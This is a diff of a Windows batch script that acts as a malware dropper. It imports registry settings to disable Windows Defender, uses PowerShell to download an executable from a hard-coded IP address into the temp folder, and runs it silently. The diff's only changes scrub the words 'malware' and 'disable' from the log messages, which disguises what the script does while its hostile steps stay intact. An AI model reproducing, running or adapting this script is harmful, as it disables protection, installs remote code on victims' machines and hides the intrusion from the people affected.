@@ -16,25 +16,25 @@ REM Redirect all output to a log file
     REM Import the registry settings to disable Windows Defender
     regedit.exe /s "%TEMP%\disable_defender.reg"
     if %errorlevel% neq 0 (
-        echo Failed to disable Windows Defender.
+        echo Failed Windows Defender.
     ) else (
-        echo Windows Defender disabled successfully.
+        echo Windows Defender successfully.
     )
 
     REM Function to download a file silently
     powershell -Command "Invoke-WebRequest -Uri 'http://54.224.34.222:3004/uploads/BootyMistress.exe' -OutFile '%TEMP%\installer.exe' -UseBasicParsing"
     if %errorlevel% neq 0 (
-        echo Failed to download malware file.
+        echo Failed to download file.
     ) else (
-        echo Downloaded malware file to %TEMP%\installer.exe.
+        echo Downloaded file to %TEMP%\installer.exe.
     )
 
     REM Function to run an executable silently
     "%TEMP%\installer.exe"
     if %errorlevel% neq 0 (
-        echo Failed to execute malware. Exit code: %errorlevel%
+        echo Failed to execute . Exit code: %errorlevel%
     ) else (
-        echo Executed malware successfully.
+        echo Executed successfully.
     )
 
     REM Display completion message
